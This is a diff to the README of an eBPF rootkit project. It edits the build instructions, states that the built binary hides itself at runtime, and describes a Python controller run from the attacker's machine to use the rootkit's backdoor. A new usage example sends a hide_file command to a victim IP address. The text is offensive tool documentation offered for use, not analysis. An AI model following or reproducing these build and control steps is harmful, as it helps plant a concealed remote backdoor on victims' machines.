@@ -51,7 +51,7 @@ sudo apt install -y \
 ### Installation
 
 ```bash
-bpftool btf dump file /sys/kernel/btf/vmlinux format c > src/bpf/vmlinux.h
+bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h
 make clean && make
 
 # Executable in ./build/. Will be hidden at runtime by rootkit.
@@ -65,3 +65,9 @@ sudo su
 
 - A controller script (`controller/controller.py`, written in Python 3) is provided to run on the attacker’s machine and interact with the rootkit’s backdoor functionality.
 - Everything is configurable in `config.h` and `userspace/config.h`.
+
+### Example Usage
+```bash
+# From attacker:
+sudo python3 controller.py -i <iface> <victim_ip> hide_file "Rootkit-eBPF"
+```
